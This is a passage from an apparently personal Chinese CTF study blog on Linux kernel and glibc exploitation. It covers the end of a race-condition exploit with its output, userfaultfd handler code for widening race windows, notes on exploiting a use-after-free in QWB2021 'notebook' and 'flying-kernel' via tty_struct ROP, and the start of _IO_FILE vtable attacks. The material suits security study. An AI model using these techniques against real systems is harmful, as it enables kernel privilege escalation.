class="hljs-number">33</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the len of fake_flag is %d\n&quot;</span>, <span class="hljs-built_in">strlen</span>(fake_flag));<br>    <span class="hljs-keyword">pthread_t</span> race;<br>    pthread_create(&amp;race, <span class="hljs-literal">NULL</span>, race_condition, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// restore to user-space ptr and ioctl(0x1337)</span><br>    ushort time = TRY_TIME;<br>    <span class="hljs-keyword">while</span> (time--)<br>    &#123;<br>        attr.buf = fake_flag;<br>        ioctl(baby_fd, <span class="hljs-number">0x1337</span>, &amp;attr);<br>    &#125;<br><br>    flag_finish = <span class="hljs-number">1</span>;<br>    pthread_join(race, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// output the result</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The result is:&quot;</span>);<br>    system(<span class="hljs-string">&quot;dmesg | grep flag&#123;&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>然后接着发现结果不是竞态条件无法成功, 要么就是smp pti错误. 其实是<code>strtoull</code>写成了<code>strtoll</code>, 导致指针转换不对.</p><p>下面是运行结果:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">/ $ ./newexp                                                                                               <br>the address of flag_kaddr is 0xffffffffc0322028                                                            <br>the len of fake_flag is 33                                                                                 <br>The result is:                                                                                             <br>[    4.191564] Looks like the flag is not a secret anymore. So here is it flag&#123;THIS_WILL_BE_YOUR_FLAG_1234&#125;<br></code></pre></div></td></tr></table></figure><h3 id="userfaultfd-的使用"><a href="#userfaultfd-的使用" class="headerlink" title="userfaultfd 的使用"></a>userfaultfd 的使用</h3><blockquote><p>以下来自CTF-WiKi</p></blockquote><p>userfaultfd 并不是一种攻击的名字，它是 Linux 提供的一种让用户自己处理缺页异常的机制，初衷是为了提升开发灵活性，在 kernel pwn 中常被用于提高条件竞争的成功率。比如在如下的操作时</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">copy<span class="hljs-constructor">_from_user(<span class="hljs-params">kptr</span>, <span class="hljs-params">user_buf</span>, <span class="hljs-params">size</span>)</span>;<br></code></pre></div></td></tr></table></figure><p>如果在进入函数后，实际拷贝开始前线程被中断换下 CPU，别的线程执行，修改了 kptr 指向的内存块的所有权（比如 kfree 掉了这个内存块），然后再执行拷贝时就可以实现 UAF。这种可能性当然是比较小的，但是如果 user_buf 是一个 mmap 的内存块，并且我们为它注册了 userfaultfd，那么在拷贝时出现缺页异常后此线程会先执行我们注册的处理函数，在处理函数结束前线程一直被暂停，结束后才会执行后面的操作，大大增加了竞争的成功率。</p><blockquote><p>in man page: userfaultfd - create a file descriptor for handling page faults in user space</p></blockquote><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p>然后简单说一下为内存块注册 userfaultfd 的方法，比较详细介绍的可以参考 <a href="https://man7.org/linux/man-pages/man2/userfaultfd.2.html">man page</a>。这个man page是在系统调用的哪一个section, 而具体使用还有一个page是很重要的, 在section7 的<a href="https://man7.org/linux/man-pages/man2/ioctl_userfaultfd.2.html"><code>ioctl_userfaultfd</code></a>. 里面有结构体的定义和使用. </p><blockquote><p> O_CLOEXEC是个啥: 在执行exec()的时候关闭这个fd.</p></blockquote><blockquote><p>关于userfaultfd:</p><ul><li>关键词: 多线程程序 一个线程page_fault 另一个线程fault_handling</li><li>glibc provides no wrapper for userfaultfd(),<br>necessitating the use of syscall(2): <code>syscall(__NR_userfaultfd, oflags);</code> </li><li>the faulting thread is put to sleep and an event is generated that can be read <em><strong>via the userfaultfd file descriptor</strong></em>.</li><li>more details are as follows:</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ErrExit</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* err_msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">puts</span>(err_msg);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">RegisterUserfault</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *fault_page,<span class="hljs-keyword">void</span> *handler)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">pthread_t</span> thr;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">ua</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">ur</span>;</span><br><span class="hljs-comment">//glibc provides no wrapper for userfaultfd(), necessitating the use of syscall as below:</span><br>    <span class="hljs-keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    ua.api = UFFD_API;<br>    ua.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="hljs-number">-1</span>)<br>        ErrExit(<span class="hljs-string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);<br><br>    ur.range.start = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)fault_page; <span class="hljs-comment">//我们要监视的区域</span><br>    ur.range.len   = PAGE_SIZE;<br>    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="hljs-number">-1</span>) <span class="hljs-comment">//注册缺页错误处理</span><br>        <span class="hljs-comment">//当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作</span><br>        ErrExit(<span class="hljs-string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);<br>    <span class="hljs-comment">//开一个线程，接收错误的信号，然后处理</span><br>    <span class="hljs-keyword">int</span> s = pthread_create(&amp;thr, <span class="hljs-literal">NULL</span>,handler, (<span class="hljs-keyword">void</span>*)uffd);<br>    <span class="hljs-keyword">if</span> (s!=<span class="hljs-number">0</span>)<br>        ErrExit(<span class="hljs-string">&quot;[-] pthread_create&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>我们在注册的时候，只要使用类似于</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">RegisterUserfault(mmap_buf, handler);<br></code></pre></div></td></tr></table></figure><p>的操作就可以把 handler 函数绑定到 mmap_buf，当 mmap_buf 出现缺页异常时就会调用 handler 来处理。</p><p>然后比较重要的是 handler 的写法，开头是一些模板化的操作</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-title">userfaultfd_leak_handler</span><span class="hljs-params">(<span class="hljs-keyword">void</span>* arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> uffd = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) arg;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br><span class="hljs-comment">//the number of ready fds.</span><br>    <span class="hljs-keyword">int</span> nready;<br>    pollfd.fd = uffd;<br>    pollfd.events = POLLIN;<br><span class="hljs-comment">//returns the number of elements in pollfds whose revents have been set to a non-negative value</span><br><span class="hljs-comment">//poll(struct pollfd *fds, nfds_t nfds, int timeout); (-1 timeout means infinite timeout.)</span><br><span class="hljs-comment">//fds is a array of type pollfd</span><br>    nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>); <br></code></pre></div></td></tr></table></figure><p>定义一个 uffd_msg 类型的结构体在未来接受消息。</p><p>需要一个 pollfd 类型的结构体提供给轮询操作，其 fd 设置为传入的 arg，events 设置为 POLLIN。然后执行 <code>poll(&amp;pollfd, 1, -1);</code> 来进行轮询，这个函数会一直进行轮询，直到出现缺页错误。</p><p>然后需要处理缺页</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//here is critical: stop the faulting process.</span><br>    sleep(<span class="hljs-number">3</span>);<br>    <span class="hljs-keyword">if</span> (nready != <span class="hljs-number">1</span>)<br>    &#123;<span class="hljs-comment">//there is only one element in fds, so it must be 1.</span><br>        ErrExit(<span class="hljs-string">&quot;[-] Wrong poll return val&quot;</span>);<br>    &#125;<br><span class="hljs-comment">//uffd will return the msg infomation, so just read from it.</span><br>    nready = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br>    <span class="hljs-keyword">if</span> (nready &lt;= <span class="hljs-number">0</span>)<br>        ErrExit(<span class="hljs-string">&quot;[-] msg err&quot;</span>);<br><span class="hljs-comment">//mmap a page. </span><br>    <span class="hljs-keyword">char</span>* page = (<span class="hljs-keyword">char</span>*) mmap(<span class="hljs-literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (page == MAP_FAILED)<br>        ErrExit(<span class="hljs-string">&quot;[-] mmap err&quot;</span>);<br><span class="hljs-comment">//The faulted thread will be stopped from execution until the page fault is resolved </span><br><span class="hljs-comment">//from user-space by either an UFFDIO_COPY or an UFFDIO_ZEROPAGE ioctl.</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uc</span>;</span><br>    <span class="hljs-comment">// init page, 呃呃呃呃呃, 怎么会有sizeof(page)这种操作.</span><br>    <span class="hljs-comment">// 整个要改成 PAGE_SIZE</span><br>    <span class="hljs-comment">// WRONG: memset(page, 0, sizeof(page));</span><br>    <span class="hljs-built_in">memset</span>(page, <span class="hljs-number">0</span>, PAGE_SIZE);<span class="hljs-comment">// CORRECT</span><br>    uc.src = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) page;<br><span class="hljs-comment">//page aligned</span><br>    uc.dst = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="hljs-number">1</span>);<br>    uc.len = PAGE_SIZE;<br>    uc.mode = <span class="hljs-number">0</span>;<br>    uc.copy = <span class="hljs-number">0</span>;<br>    ioctl(uffd, UFFDIO_COPY, &amp;uc);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] leak handler done&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>注意在开头加入了 sleep 操作，在 poll 结束返回时就代表着出现了缺页了，此时 sleep 就可以之前说到的暂停线程的效果。然后进行一些判断什么的，并 mmap 一个页给缺页的页，都是模板化的操作。此处 mmap 的内存在缺页时有自己的处理函数，所以不会一直套娃地缺页下去。</p><p>我们这里在遇到返回值错误的时候就直接错误退出了，在工程上应该会讲究一些，还会在外面套一个大死循环什么的，这里就不多说了，毕竟我们只需要利用它把线程暂停就可以了。</p><blockquote><p>头文件:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-comment">//#include &lt;errno.h&gt;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-comment">//#include &lt;signal.h&gt;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br></code></pre></div></td></tr></table></figure></blockquote><blockquote><p><em><strong>uffdio_copy怎么用?</strong></em> </p><p>先mmap一个chunk, 然后使用UFFDIO_COPY+ioctl操作交给内核完成copy操作. 不是很明白为什么是copy, 如果只为了全0page, 那还要弄一个4kb的页面, 不过copy的同时可能也在发生页错误的地方自动分配了相应空间, 也可以说是可以两用吧.<a href="https://zhuanlan.zhihu.com/p/385645268">https://zhuanlan.zhihu.com/p/385645268</a></p></blockquote><h4 id="QWB2021-notebook"><a href="#QWB2021-notebook" class="headerlink" title="QWB2021-notebook"></a>QWB2021-notebook</h4><blockquote><p>在run.sh中看到一行<code>exec timeout 300 qemu-....</code>, 第一个和第二个是bash的built-in commands, 分别是替换当前shell为另一个程序, 以及设置命令运行时间. 过于麻烦, 直接换成执行qemu.</p><p>关于kptr_restrict(<code>echo 1 &gt; /proc/sys/kernel/kptr_restrict</code>): the <code>%pK</code> printk format specifier can be used to print out kernel pointer, and the /proc/sys/kernel/kptr_restrict sysctl can disable this behavior.</p><p>关于run.sh中qemu的-append内核启动选项loglevel=3: 直接删掉, 启动的时候就会print出kernel ring buffer.</p><p>怀疑<code>__fentry__</code>就是一个function tracer.</p><p>遇到一些内核函数, 具体可以到网站查找. 比如<a href="https://elixir.bootlin.com/linux/v5.4/source/mm/usercopy.c#L256"><code>check_object_size()</code></a> </p></blockquote><p>保护情况: kaslr, smep, smap, 2 cores and 2 threads loglevel=3 + dmesg(已关, 实际不可用) kptr</p><blockquote><p>启动的时候耗时17秒, 结果查了半天发现是<code>init</code>里面一行<code>ifup eth0 &gt; /dev/null 2&gt;/dev/null</code>导致系统hang up. 不知道这清空stdout和stderr的意义是何在, 他的输出如下:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ifup eth0</span>                                                 <br>Waiting for interface eth0 to appear............... timeout!  <br>run-parts: /etc/network/if-pre-up.d/wait_iface: exit status 1 <br></code></pre></div></td></tr></table></figure><p>就在这儿硬等. linux网络设置不太懂, 先不管了.</p></blockquote><p>在init中初始化了一个读写锁. 可能有点用处.</p><p>还有一个note结构体数组notebook, 由一个指向内容的指针和大小两个变量组成, 每个四字. 有16个, 并且有检查越界.</p><ul><li>read: 读取size字节, 会检查note地址真实性 heap或stack块完整性 是否在kernel text area里</li><li>write: 写入size字节, 检查同上.</li><li>ioctl: 参数为3个size_t类型的结构体. 分别是<code>idx, size, buf</code>.<ul><li>0x100: note_add size小于0x60, 复制buf到name(??), note为NULL则重新kmalloc, 有<strong>读者锁</strong>.</li><li>0x64: note_gift 复制整个notebook(0x100bytes)到buf中</li><li>0x200: note_del 释放note + 如果size为0则清空结构体, <strong>写者锁</strong>.</li><li>0x300: note_edit 调整note空间大小, <strong>读者锁</strong>.<ul><li>size没变化, 退出. </li><li>如果size为0则认为是已经free, 退出. </li><li>现在使用<code>realloc</code>一块chunk, 赋值给note, 然后unlock读者锁.</li></ul></li></ul></li></ul><p>提供了notebook内核模块的基址. 在<code>/tmp/moduleaddr</code>里. </p><p>两个有读者锁的函数都没有检查size, 因此可以等于0. </p><p>所以方法是: </p><ul><li>先add一个, 然后在edit中执行完krealloc后卡住, 并且newsize为0, 也就是直接释放这一块, 然后在add中修改size为0x60后卡住, 这样就能UAF一个任意大小的块(要先通过add再edit一个大chunk, 这样才能继续进行上面的操作), 不过只能操纵前0x60个字节. </li></ul><p>UAF之后可以使用之前介绍过的tty_struct方法来构造ROP提权, 返回用户态执行shell. </p><p>还有一种方法, work_for_cpu函数, 总结: 看麻了.</p><h2 id="flying-kernel-1"><a href="#flying-kernel-1" class="headerlink" title="flying-kernel"></a>flying-kernel</h2><ul><li>printk中使用的KERN_INFO是一个只函数字的字符串, 和要打印的字符串用空格运算符拼接在一起, 所以在IDA中会看到以数字(还有一个header:<code>\001</code>)开头的string, 内核用这个来判断log_level.</li><li>差点忘了这是在container里面运行qemu.</li><li>至于那些网络配置文件应该是远程部署环境了, 我应该不用在意. </li><li><strong>如果我在本地运行好像也不用docker.</strong>…..</li></ul><hr><p>在自定义的ioctl函数中，设置了参数2为command，有三种情况：</p><ul><li>command = 0x5555时：调用kmalloc函数申请一个0x80的chunk</li><li>command = 0x6666时：free chunk但指针没清空</li><li>command = 0x7777时：调用printk输出，存在格式化字符串漏洞</li></ul><p>一共两个漏洞点：0x80的UAF，和一个格式化字符串漏洞</p><p>这一题没有利用tty, 而是另外一个结构体. work_for_cpu. </p><p><a href="https://www.anquanke.com/post/id/264563">出题总结</a> </p><h2 id="IO-FILE-Exploitation"><a href="#IO-FILE-Exploitation" class="headerlink" title="_IO_FILE Exploitation"></a>_IO_FILE Exploitation</h2><p>具体见<a href="https://ctf-wiki.org/pwn/linux/user-mode/io-file/fake-vtable-exploit/">Wiki</a>. ;</p><p>_IO_FILE的结构体:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* The tag name of this struct is _IO_FILE to preserve historic</span><br><span class="hljs-comment">   C++ mangled names for functions taking FILE* arguments.</span><br><span class="hljs-comment">   That name should not be used in new code.  */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">int</span> _flags;                <span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-keyword">char</span> *_IO_read_ptr;        <span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-keyword">char</span> *_IO_read_end;        <span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-keyword">char</span> *_IO_read_base;        <span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-keyword">char</span> *_IO_write_base;        <span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-keyword">char</span> *_IO_write_ptr;        <span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-keyword">char</span> *_IO_write_end;        <span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-keyword">char</span> *_IO_buf_base;        <span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-keyword">char</span> *_IO_buf_end;        <span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-keyword">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-keyword">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-keyword">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br>  <span class="hljs-keyword">int</span> _fileno;<br>  <span class="hljs-keyword">int</span> _flags2;<br>  <span class="hljs-keyword">__off_t</span> _old_offset; <span class="hljs-comment">/* This used to be _offset but it&#x27;s too small.  */</span><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> _cur_column;<br>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">char</span> _vtable_offset;<br>  <span class="hljs-keyword">char</span> _shortbuf[<span class="hljs-number">1</span>];<br>  _IO_lock_t *_lock;<br><span class="hljs-comment">//#ifdef _IO_USE_OLD_IO_FILE</span><br><span class="hljs-comment">//&#125;;</span><br><span class="hljs-comment">//struct _IO_FILE_complete</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//  struct _IO_FILE _file;</span><br><span class="hljs-comment">//#endif</span><br>  <span class="hljs-keyword">__off64_t</span> _offset;<br>  <span class="hljs-comment">/* Wide character stream stuff.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *_<span class="hljs-title">codecvt</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> *_<span class="hljs-title">wide_data</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">freeres_list</span>;</span><br>  <span class="hljs-keyword">void</span> *_freeres_buf;<br>  <span class="hljs-keyword">size_t</span> __pad5;<br>  <span class="hljs-keyword">int</span> _mode;<br>  <span class="hljs-comment">/* Make sure we don&#x27;t get into trouble again.  */</span><br>  <span class="hljs-keyword">char</span> _unused2[<span class="hljs-number">15</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">int</span>) - <span class="hljs-number">4</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">void</span> *) - <span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">size_t</span>)];<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>vtable, 看注释:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* We always allocate an extra word following an _IO_FILE.</span><br><span class="hljs-comment">   This contains a pointer to the function jump table used.</span><br><span class="hljs-comment">   This is for compatibility with C++ streambuf; the word can</span><br><span class="hljs-comment">   be used to smash to a pointer to a virtual function table. */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>  FILE file;<br>  <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *<span class="hljs-title">vtable</span>;</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>_IO_jump_t内容, 已经全部定义:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> JUMP_FIELD(TYPE, NAME) TYPE NAME</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span></span><br><span class="hljs-class">&#123;</span><br>    JUMP_FIELD(<span class="hljs-keyword">size_t</span>, __dummy);<br>    JUMP_FIELD(<span class="hljs-keyword">size_t</span>, __dummy2);<br>    JUMP_FIELD(_IO_finish_t, __finish);<br>    JUMP_FIELD(_IO_overflow_t, __overflow);<br>    JUMP_FIELD(_IO_underflow_t, __underflow);<br>    JUMP_FIELD(_IO_underflow_t, __uflow);<br>    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<br>    <span class="hljs-comment">/* showmany */</span><br>    JUMP_FIELD(_IO_xsputn_t, __xsputn);<br>    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<br>    JUMP_FIELD(_IO_seekoff_t, __seekoff);<br>    JUMP_FIELD(_IO_seekpos_t, __seekpos);<br>    JUMP_FIELD(_IO_setbuf_t, __setbuf);<br>    JUMP_FIELD(_IO_sync_t, __sync);<br>    JUMP_FIELD(_IO_doallocate_t, __doallocate);<br>    JUMP_FIELD(_IO_read_t, __read);<br>    JUMP_FIELD(_IO_write_t, __write);<br>    JUMP_FIELD(_IO_seek_t, 